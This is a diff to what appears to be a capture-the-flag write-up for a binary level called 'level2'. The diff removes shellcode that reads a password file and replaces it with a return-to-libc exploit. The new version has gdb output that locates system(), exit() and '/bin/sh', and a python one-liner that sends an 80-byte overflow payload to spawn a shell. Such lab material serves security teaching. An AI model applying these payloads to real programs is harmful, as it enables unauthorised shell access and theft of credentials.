@@ -12,20 +12,69 @@
     0x37634136 in ?? ()
 ```
 
+Finding system()
 
 ```
-   export code=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/user/level2/.pass'
+   gdb) b main
+   Breakpoint 1 at 0x8048542
+   (gdb) r
+   Starting program: /home/user/level2/level2 
+
+   Breakpoint 1, 0x08048542 in main ()
+   (gdb) p system
+   $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
 ```
 
-get the shellcode address
+Finding exit()
 
 ```
-   (gdb) start
-   (gdb) p/x getenv("code")
-   $1 = 0xbfffff68
+   p exit
+   $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 ```
 
-python -c 'print("A"*80 + "\x68\xff\xff\xbf")' > /tmp/hh
+Finding /bin/sh
+
+```
+   (gdb) info proc map
+   process 2743
+   Mapped address spaces:
+
+   Start Addr   End Addr       Size     Offset objfile
+   0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
+   0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
+   0xb7e2b000 0xb7e2c000     0x1000        0x0 
+   0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+   0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+   0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+   0xb7fd2000 0xb7fd5000     0x3000        0x0 
+   0xb7fdb000 0xb7fdd000     0x2000        0x0 
+   0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+   0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+   0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+   0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+   0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+```
+
+now we need to find the offset of string /bin/sh relative to the start of the libc binary:
+
+```
+   (gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
+   0xb7f8cc58
+   1 pattern found
+```
+
+- Buffer overflow length: 80 bytes
+
+- Address of system(): 0xb7e6b060 => \x60\xb0\xe6\xb7
+
+- Address of exit(): 0xb7e5ebe0 => \xe0\xeb\xe5\xb7
+
+- Address of "/bin/sh": 0xb7f8cc58 => \x58\xcc\xf8\xb7
+
+
+
+python -c 'print("A"*80 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")' > /tmp/hh
 (cat /tmp/hh; cat) | ./level2
 
 
